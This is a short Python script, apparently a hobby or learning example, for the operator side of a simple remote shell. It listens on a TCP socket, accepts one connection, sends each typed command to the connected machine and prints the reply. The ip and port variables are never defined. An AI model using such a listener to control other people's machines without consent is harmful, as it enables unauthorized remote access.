from socket import *

socket =  socket(AF_INET, SOCK_STREAM)
socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

socket.bind((ip, port))
socket.listen(0)
print("lisining...")

connect, addr = socket.accept()
print("connected", str(addr))

while True:
    command = input("==>")
    connect.sendall(command.encode("utf-8"))
    data = connect.recv(1024).decode("utf-8")
    print(data)
